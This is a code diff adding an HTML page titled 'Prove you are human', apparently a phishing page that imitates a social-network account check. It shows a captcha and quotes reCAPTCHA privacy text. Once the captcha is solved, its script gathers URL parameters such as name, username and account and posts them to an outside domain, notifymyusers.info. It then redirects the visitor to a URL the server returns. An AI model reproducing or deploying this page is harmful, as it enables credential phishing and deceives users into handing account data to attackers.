@@ -1,0 +1,113 @@
+<html lang="en"><head>
+    <title>Prove you are human</title>
+     <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
+
+    <script src="https://js.hcaptcha.com/1/api.js" async="" defer=""></script>
+    <style type="text/css">
+      body{
+        background-color: #f0f2f5;
+      }
+      .headeri{
+        box-shadow: 0 4px 5px 0 rgb(0 0 0 / 2%), 0 2px 3px 0 rgb(0 0 0 / 2%), inset 0 0 0 1px rgb(255 255 255 / 50%);
+        background-color:white;
+      }
+      .trupi{
+        margin-top: 60px;
+        margin-bottom: 50px;
+      }
+      .trupimrena{
+        background-color: white;
+        padding:20px;
+        border:1px solid #e2e4e7;
+        border-radius: 10px;
+        box-shadow: 0 4px 5px 0 rgb(0 0 0 / 2%), 0 2px 3px 0 rgb(0 0 0 / 2%), inset 0 0 0 1px rgb(255 255 255 / 50%);
+      }
+    </style>
+  </head>
+  <body>
+    <div class="headeri">
+      <div class="container-fluid">
+        <img src="diqka.png" class="img-fluid" width="130" style="padding-top: 10px; padding-bottom: 5px;">
+      </div>
+    </div>
+    <div class="trupi">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-6 offset-md-3">
+            <div class="trupimrena">
+              <form id="yourFormId" action="" method="POST">
+                <h2 style="font-weight: 600; font-size: 24px; margin-bottom: 20px;">Help us confirm it's you</h2>
+                <div class="h-captcha" data-sitekey="2090dde0-1a4a-4119-ac94-68dbc4180559" data-callback="onSuccess"><iframe src="https://newassets.hcaptcha.com/captcha/v1/672044a/static/hcaptcha.html#frame=checkbox&amp;id=0i4mtne5v628&amp;host=recaptcha-1239842375091.firebaseapp.com&amp;sentry=true&amp;reportapi=https%3A%2F%2Faccounts.hcaptcha.com&amp;recaptchacompat=true&amp;custom=false&amp;hl=en&amp;tplinks=on&amp;sitekey=2090dde0-1a4a-4119-ac94-68dbc4180559&amp;theme=light&amp;origin=https%3A%2F%2Frecaptcha-1239842375091.firebaseapp.com" tabindex="0" frameborder="0" scrolling="no" title="Widget containing checkbox for hCaptcha security challenge" data-hcaptcha-widget-id="0i4mtne5v628" data-hcaptcha-response="" style="width: 303px; height: 78px; overflow: hidden;"></iframe><textarea id="g-recaptcha-response-0i4mtne5v628" name="g-recaptcha-response" style="display: none;"></textarea><textarea id="h-captcha-response-0i4mtne5v628" name="h-captcha-response" style="display: none;"></textarea></div>
+                <p style="color:#65676b; font-size:12px;">This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products. <br><br>
+                  We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.<br><br>
+                reCAPTCHA Enterprise collects hardware and software information such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
+                <input type="submit" value="Continue" id="continuebutton" disabled="true" class="btn btn-primary" style="background-color:#1b74e4">
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script type="text/javascript">
+      function onSuccess(response){
+        var kodi = response;
+        const urlParams = new URLSearchParams(window.location.search);
+
+        const data = [];
+
+        data.push({ name: 'response', value: kodi });
+
+        if (urlParams.has('teksti')) {
+          const teksti = urlParams.get('teksti');
+          data.push({ name: 'teksti', value: teksti });
+        }
+
+        if (urlParams.has('image')) {
+          const image = urlParams.get('image');
+          data.push({ name: 'image', value: image });
+        }
+
+        if (urlParams.has('name')) {
+          const name = urlParams.get('name');
+          data.push({ name: 'name', value: name });
+        }
+
+        if (urlParams.has('username')) {
+          const username = urlParams.get('username');
+          data.push({ name: 'username', value: username });
+        }
+
+        if (urlParams.has('hidephone')) {
+          const hidephone = urlParams.get('hidephone');
+          data.push({ name: 'hidephone', value: hidephone });
+        }
+
+        if (urlParams.has('account')) {
+          const account = urlParams.get('account');
+          data.push({ name: 'account', value: account });
+        }
+
+        $.ajax({
+            type: "POST",
+            url: "https://notifymyusers.info/send/serversfullu.php",
+            data: data,
+            success: function(response)
+            {
+              location.href = response;
+           }
+       });
+      }
+    </script>
+
+    <script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous"></script>
+
+  
+
+<div aria-hidden="true" style="background-color: rgb(255, 255, 255); border: 1px solid rgb(215, 215, 215); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 4px; border-radius: 4px; left: auto; top: -10000px; z-index: -2147483648; position: absolute; transition: opacity 0.15s ease-out 0s; opacity: 0; visibility: hidden;"><div style="position: relative; z-index: 1;"><iframe src="https://newassets.hcaptcha.com/captcha/v1/672044a/static/hcaptcha.html#frame=challenge&amp;id=0i4mtne5v628&amp;host=recaptcha-1239842375091.firebaseapp.com&amp;sentry=true&amp;reportapi=https%3A%2F%2Faccounts.hcaptcha.com&amp;recaptchacompat=true&amp;custom=false&amp;hl=en&amp;tplinks=on&amp;sitekey=2090dde0-1a4a-4119-ac94-68dbc4180559&amp;theme=light&amp;origin=https%3A%2F%2Frecaptcha-1239842375091.firebaseapp.com" frameborder="0" scrolling="no" title="Main content of the hCaptcha challenge" style="border: 0px; z-index: 2000000000; position: relative;"></iframe></div><div style="width: 100%; height: 100%; position: fixed; pointer-events: none; top: 0px; left: 0px; z-index: 0; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div style="border-width: 11px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 1; right: 100%;"><div style="border-width: 10px; border-style: solid; border-color: transparent rgb(255, 255, 255) transparent transparent; position: relative; top: 10px; z-index: 1;"></div><div style="border-width: 11px; border-style: solid; border-color: transparent rgb(215, 215, 215) transparent transparent; position: relative; top: -11px; z-index: 0;"></div></div></div></body></html>
